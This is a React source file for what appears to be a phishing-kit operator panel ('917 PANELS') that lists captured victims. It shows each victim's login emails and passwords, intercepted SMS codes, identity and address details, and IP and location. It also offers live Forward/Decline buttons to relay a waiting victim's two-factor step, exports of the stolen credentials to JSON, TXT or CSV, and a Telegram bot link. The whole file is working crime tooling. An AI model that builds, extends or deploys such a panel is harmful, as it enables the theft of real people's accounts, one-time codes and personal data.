import React, { useState, useEffect } from 'react';
import { useNavigate, Link } from 'react-router-dom';
import { 
  Users, 
  LogOut, 
  LayoutDashboard, 
  ShieldCheck,
  Search,
  X,
  Copy,
  User as UserIcon,
  Trash2,
  FileText,
  CheckCircle2,
  Clock,
  Monitor,
  Download,
  FileCode,
  Terminal,
  Send
} from 'lucide-react';
import { motion, AnimatePresence } from 'motion/react';
import { ClientStore, ClientData, ClientStatus, ProcessingStatus } from '../services/ClientStore';

export default function AdminClients() {
  const navigate = useNavigate();
  const [clients, setClients] = useState(ClientStore.getClients());
  const [selectedClient, setSelectedClient] = useState<ClientData | null>(null);
  const [searchTerm, setSearchTerm] = useState('');
  const [statusFilter, setStatusFilter] = useState<ClientStatus | 'ALL'>('ALL');

  useEffect(() => {
    const fetchData = async () => {
      await ClientStore.fetchClients();
      setClients(ClientStore.getClients());
    };
    fetchData();
    const interval = setInterval(fetchData, 2000);
    return () => clearInterval(interval);
  }, []);

  const handleSignOut = () => {
    localStorage.removeItem('isAdminAuthenticated');
    navigate('/admin');
  };

  const handleDelete = async (e: React.MouseEvent, id: string) => {
    e.stopPropagation();
    if (window.confirm('Client löschen?')) {
      await ClientStore.deleteClient(id);
      setClients(ClientStore.getClients());
      if (selectedClient?.id === id) setSelectedClient(null);
    }
  };

  const updateProcessing = async (id: string, status: ProcessingStatus) => {
    await ClientStore.addOrUpdateClient({ id, processingStatus: status });
    setClients(ClientStore.getClients());
  };

  const updateNotes = async (id: string, notes: string) => {
    await ClientStore.addOrUpdateClient({ id, notes });
  };

  const exportAll = () => {
    const all = ClientStore.getClients();
    const blob = new Blob([JSON.stringify(all, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = `917_export_all_${new Date().getTime()}.json`;
    a.click();
    URL.revokeObjectURL(url);
  };

  const exportClient = (client: ClientData, format: 'json' | 'txt' | 'csv') => {
    let content = '';
    let fileName = `client_${client.id}`;
    if (format === 'json') {
      content = JSON.stringify(client, null, 2);
      fileName += '.json';
    } else if (format === 'txt') {
      content = `ID: ${client.id}\nIP: ${client.ip}\nEMAIL: ${client.email}\nPASS: ${client.password}\nSMS: ${client.smsCode}\nMODE: ${client.executionMode}\nSTATUS: ${client.status}`;
      fileName += '.txt';
    } else {
      content = `id,ip,email,password,sms,mode,status\n${client.id},${client.ip},${client.email},${client.password},${client.smsCode},${client.executionMode},${client.status}`;
      fileName += '.csv';
    }
    const blob = new Blob([content], { type: 'text/plain' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = fileName;
    a.click();
    URL.revokeObjectURL(url);
  };

  const filteredClients = clients.filter(client => {
    const matchesSearch = 
      client.ip.toLowerCase().includes(searchTerm.toLowerCase()) || 
      (client.email && client.email.toLowerCase().includes(searchTerm.toLowerCase()));
    const matchesStatus = statusFilter === 'ALL' || client.status === statusFilter;
    return matchesSearch && matchesStatus;
  });

  return (
    <div className="flex h-screen bg-black text-white font-mono selection:bg-white selection:text-black antialiased">
      {/* Sidebar - Same as Dashboard */}
      <div className="w-64 border-r border-white/5 flex flex-col p-8 h-full shrink-0">
        <div className="mb-16">
          <h1 className="text-xl font-black italic tracking-tighter text-white uppercase">917 PANELS</h1>
          <p className="text-[#222] text-[9px] font-bold uppercase tracking-[0.2em] mt-1">Version 1.0.0</p>
        </div>

        <nav className="flex-grow space-y-12">
          <div>
            <p className="text-[#222] text-[10px] font-bold uppercase tracking-widest mb-6">Main</p>
            <div className="space-y-4">
              <Link to="/admin/dashboard" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <LayoutDashboard className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Dashboard</span>
              </Link>
              <Link to="/admin/clients" className="flex items-center gap-3 text-white">
                <Users className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Clients</span>
              </Link>
              <Link to="/admin/control" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Monitor className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Control</span>
              </Link>
            </div>
          </div>

          <div>
            <p className="text-[#222] text-[10px] font-bold uppercase tracking-widest mb-6">Integrations</p>
            <div className="space-y-4">
              <Link to="/admin/telegram" className="flex items-center gap-3 text-[#333] hover:text-white transition-colors">
                <Send className="w-4 h-4" />
                <span className="text-xs font-bold uppercase tracking-tight">Telegram Bot</span>
              </Link>
            </div>
          </div>
        </nav>

        <div className="pt-8 border-t border-white/5 space-y-6">
          <div>
            <p className="text-[10px] font-bold uppercase tracking-tighter text-white">admin</p>
            <p className="text-[9px] font-bold text-[#222] uppercase tracking-[0.2em] mt-0.5"><ShieldCheck className="w-3 h-3 inline mr-1 text-white/20" /> ADMIN</p>
          </div>
          <button onClick={handleSignOut} className="flex items-center gap-2 text-[#333] hover:text-white text-[10px] uppercase font-bold tracking-widest">
            <LogOut className="w-3 h-3" /> Sign Out
          </button>
        </div>
      </div>

      {/* Main Content */}
      <div className="flex-1 overflow-y-auto p-12">
        <header className="mb-12 flex justify-between items-end">
          <div>
            <h2 className="text-4xl font-black tracking-tighter uppercase italic mb-2">Client Management</h2>
            <p className="text-[10px] text-[#222] font-black uppercase tracking-[0.3em]">Full archive & realtime interceptor</p>
          </div>
          <div className="flex flex-col items-end gap-2 text-right">
             <div className="flex items-center gap-2 mb-2">
                <span className="w-1.5 h-1.5 rounded-full bg-green-500 animate-pulse shadow-[0_0_8px_rgba(34,197,94,0.5)]" />
                <span className="text-[9px] font-black uppercase text-green-500 tracking-[0.2em]">Connected</span>
             </div>
             <button 
                onClick={exportAll}
                className="flex items-center gap-2 px-3 py-1.5 rounded text-[10px] font-black uppercase tracking-widest bg-white/5 text-[#444] border border-white/5 hover:border-white/10 hover:text-white"
              >
                <Download className="w-3 h-3" />
                Export All
              </button>
          </div>
        </header>

        {/* Filters */}
        <div className="grid grid-cols-[1fr_auto] gap-6 mb-12">
          <div className="relative">
            <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-[#333]" />
            <input 
              type="text" 
              placeholder="Filter by IP, City or Email..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="w-full bg-[#050505] border border-white/5 rounded pl-12 pr-4 py-4 text-xs font-bold placeholder-[#222] focus:border-white/10 outline-none transition-all uppercase tracking-tight"
            />
          </div>
          <div className="flex gap-2">
            {(['ALL', 'CONNECTED', 'PENDING', 'ACCEPTED', 'BLOCKED'] as const).map(s => (
              <button
                key={s}
                onClick={() => setStatusFilter(s)}
                className={`px-4 py-4 rounded text-[9px] font-black uppercase tracking-widest border transition-all ${
                  statusFilter === s ? 'bg-white text-black border-white' : 'text-[#333] border-white/5 hover:border-white/10 hover:text-white'
                }`}
              >
                {s}
              </button>
            ))}
          </div>
        </div>

        {/* Clients List */}
        <div className="space-y-[1px] bg-white/5 border border-white/5">
          {filteredClients.length === 0 ? (
            <div className="bg-black p-20 text-center text-[#222] uppercase text-[10px] font-bold italic tracking-widest">No entries found</div>
          ) : filteredClients.map(client => (
            <div 
              key={client.id}
              onClick={() => setSelectedClient(client)}
              className="grid grid-cols-[120px_1fr_120px_150px_80px] bg-black hover:bg-white/[0.02] p-6 cursor-pointer items-center border-b border-white/[0.02] last:border-0"
            >
              <div className="flex items-center">
                <span className={`w-1.5 h-1.5 rounded-full ${client.status === 'ACCEPTED' ? 'bg-green-500' : client.status === 'BLOCKED' ? 'bg-red-500' : 'bg-primary'}`} />
                <span className="ml-3 text-[10px] font-black uppercase tracking-widest text-[#444] italic">{client.status}</span>
              </div>
              <div className="flex items-center gap-12">
                <span className="text-sm font-bold text-white/90">{client.ip}</span>
                <span className="text-[10px] text-white/20 font-black uppercase truncate max-w-[150px]">{client.email || 'Initializing...'}</span>
              </div>
              <div className="flex items-center gap-2">
                {client.processingStatus === 'DONE' ? (
                  <span className="flex items-center gap-1 text-[9px] text-green-500/50 font-black uppercase"><CheckCircle2 className="w-3 h-3" /> OK</span>
                ) : (
                  <span className="flex items-center gap-1 text-[9px] text-red-500/50 font-black uppercase"><Clock className="w-3 h-3" /> TODO</span>
                )}
              </div>
              <div className="truncate text-[9px] text-[#222] font-bold uppercase overflow-hidden whitespace-nowrap px-4 italic">
                {client.notes || 'No notes'}
              </div>
              <div className="text-right">
                <button 
                  onClick={(e) => handleDelete(e, client.id)}
                  className="p-2 text-[#222] hover:text-red-500 transition-colors"
                >
                  <Trash2 className="w-4 h-4" />
                </button>
              </div>
            </div>
          ))}
        </div>

        {/* Client Detail Model (Extended) */}
        <AnimatePresence>
          {selectedClient && (
            <div className="fixed inset-0 z-50 flex items-center justify-center p-12 bg-black/95 backdrop-blur-3xl overflow-y-auto">
              <motion.div 
                initial={{ opacity: 0, scale: 0.98 }}
                animate={{ opacity: 1, scale: 1 }}
                exit={{ opacity: 0, scale: 0.98 }}
                className="w-full max-w-6xl border border-white/10 bg-black p-12 md:p-20 shadow-2xl relative my-auto"
              >
                <div className="absolute top-8 right-8 flex gap-4">
                   <button 
                    onClick={async () => {
                       await ClientStore.addOrUpdateClient({ 
                         id: selectedClient.id, 
                         processingStatus: selectedClient.processingStatus === 'DONE' ? 'TODO' : 'DONE' 
                       });
                       setSelectedClient(null);
                    }}
                    className={cn(
                      "px-4 py-2 text-[10px] font-black uppercase tracking-widest border transition-all",
                      selectedClient.processingStatus === 'DONE' ? "bg-green-500/20 text-green-500 border-green-500/30" : "bg-white/5 text-white/40 border-white/10"
                    )}
                  >
                    {selectedClient.processingStatus === 'DONE' ? 'Done' : 'Waiting'}
                  </button>
                  <button onClick={() => setSelectedClient(null)} className="text-[#222] hover:text-white transition-colors">
                    <X className="w-8 h-8" />
                  </button>
                </div>

                <div className="flex justify-between items-start mb-20">
                  <div>
                    <h3 className="text-5xl font-black italic tracking-tighter uppercase mb-4">Client Dossier</h3>
                    <p className="text-[10px] font-bold text-[#222] uppercase tracking-[0.4em] mt-3">Ref ID: {selectedClient.id}</p>
                  </div>
                  <div className="flex gap-4">
                    <button 
                      onClick={() => exportClient(selectedClient, 'json')}
                      className="flex items-center gap-2 text-[9px] font-black uppercase bg-white/5 hover:bg-white/10 px-4 py-2 border border-white/10 transition-all text-[#444] hover:text-white"
                    >
                      <FileCode className="w-3 h-3" />
                      JSON
                    </button>
                    <button 
                      onClick={() => exportClient(selectedClient, 'txt')}
                      className="flex items-center gap-2 text-[9px] font-black uppercase bg-white/5 hover:bg-white/10 px-4 py-2 border border-white/10 transition-all text-[#444] hover:text-white"
                    >
                      <Terminal className="w-3 h-3" />
                      TXT
                    </button>
                    <button 
                      onClick={() => { navigator.clipboard.writeText(JSON.stringify(selectedClient, null, 2)); alert('Copied.'); }}
                      className="flex items-center gap-2 px-6 py-3 bg-white text-black border border-white text-[9px] font-black uppercase tracking-widest transition-all shadow-[0_0_15px_rgba(255,255,255,0.1)]"
                    >
                      <Copy className="w-4 h-4" /> Copy JSON
                    </button>
                  </div>
                </div>

                {/* LIVE Approval Section */}
                {selectedClient.waitingFor !== 'NONE' && (
                  <div className="mb-16 p-8 border border-primary/20 bg-primary/5 rounded flex justify-between items-center animate-pulse">
                    <div>
                       <p className="text-[10px] font-black text-primary uppercase tracking-widest mb-1">Live Connection Waiting</p>
                       <p className="text-xl font-bold italic tracking-tighter uppercase">Client is waiting for {selectedClient.waitingFor} approval</p>
                    </div>
                    <div className="flex gap-4">
                       <button 
                        onClick={async (e) => {
                           e.stopPropagation();
                           await ClientStore.addOrUpdateClient({ id: selectedClient.id, adminDecision: 'FORWARD' });
                           alert('Client wurde freigegeben (FORWARD)');
                           setSelectedClient(null);
                        }}
                        className="px-8 py-3 bg-white text-black font-black uppercase text-[10px] tracking-widest hover:bg-neutral-200 transition-all"
                       >
                         Forward
                       </button>
                       <button 
                         onClick={async (e) => {
                           e.stopPropagation();
                           await ClientStore.addOrUpdateClient({ id: selectedClient.id, adminDecision: 'DECLINE' });
                           alert('Client wurde abgelehnt (DECLINE)');
                           setSelectedClient(null);
                         }}
                         className="px-8 py-3 bg-red-900 text-white font-black uppercase text-[10px] tracking-widest hover:bg-red-800 transition-all"
                       >
                         Decline
                       </button>
                    </div>
                  </div>
                )}

                <div className="grid grid-cols-2 md:grid-cols-4 gap-12 mb-16">
                  <div className="col-span-2 space-y-8">
                     <h6 className="text-[10px] font-black text-[#222] uppercase tracking-widest mb-6 border-b border-white/5 pb-2">Login History</h6>
                     <div className="grid grid-cols-1 gap-4">
                        {selectedClient.loginAttempts?.length > 0 ? selectedClient.loginAttempts.map((att, idx) => (
                           <div key={idx} className="p-4 bg-white/5 border border-white/5 rounded">
                              <p className="text-[9px] font-black text-[#333] mb-2">LOGIN ATTEMPT {idx + 1}</p>
                              <p className="text-xs font-bold text-white mb-1 uppercase italic">{att.email}</p>
                              <p className="text-xs font-black text-primary italic break-all">{att.pass}</p>
                           </div>
                        )) : (
                          <p className="text-[10px] font-bold text-[#222] italic uppercase">No login data yet</p>
                        )}
                     </div>
                     <div className="pt-8">
                      <h6 className="text-[9px] font-black text-[#222] uppercase tracking-widest mb-3 flex items-center gap-2"><FileText className="w-3 h-3" /> Admin Notes</h6>
                      <textarea 
                        defaultValue={selectedClient.notes}
                        onChange={(e) => updateNotes(selectedClient.id, e.target.value)}
                        placeholder="Add a private note..."
                        className="w-full bg-[#050505] border border-white/5 rounded p-4 text-xs font-bold text-white/60 placeholder-[#111] focus:border-white/10 h-32 outline-none transition-all"
                      />
                    </div>
                  </div>

                  <div className="space-y-12">
                    <div>
                      <h6 className="text-[9px] font-black text-[#222] uppercase tracking-widest mb-3">Identity Snapshot</h6>
                      <div className="space-y-2">
                        <p className="text-[11px] font-bold text-white uppercase">{selectedClient.fullName || '-'}</p>
                        <p className="text-[11px] font-bold text-white/40 italic">{selectedClient.dob || '-'}</p>
                        <p className="text-[11px] font-bold text-white/40">{selectedClient.phone || '-'}</p>
                      </div>
                    </div>
                    <div>
                      <h6 className="text-[9px] font-black text-[#222] uppercase tracking-widest mb-3">Intercepted Location</h6>
                      <div className="text-[11px] font-bold text-white italic leading-relaxed opacity-60">
                        {selectedClient.street} {selectedClient.houseNumber}<br/>
                        {selectedClient.zip} {selectedClient.cityForm}
                      </div>
                    </div>
                  </div>

                  <div className="space-y-12">
                    <div>
                      <h6 className="text-[9px] font-black text-[#222] uppercase tracking-widest mb-3">SMS Token History</h6>
                      <div className="p-10 bg-white/5 border border-white/10 text-center rounded">
                        {selectedClient.smsCode ? (
                          <p className="text-5xl font-black italic tracking-[0.2em] text-white underline underline-offset-8 decoration-primary/20 break-all">{selectedClient.smsCode}</p>
                        ) : (
                          <p className="text-[10px] font-black text-[#222] uppercase italic">Await SMS Payload</p>
                        )}
                      </div>
                    </div>
                    <div>
                       <h6 className="text-[9px] font-black text-[#222] uppercase tracking-widest mb-3">Network info</h6>
                       <p className="text-xs font-bold text-white mb-1">{selectedClient.ip}</p>
                       <p className="text-[10px] font-bold text-[#333] italic uppercase">{selectedClient.city}, {selectedClient.country}</p>
                    </div>
                  </div>
                </div>
              </motion.div>
            </div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}

function cn(...classes: any[]) {
  return classes.filter(Boolean).join(' ');
}
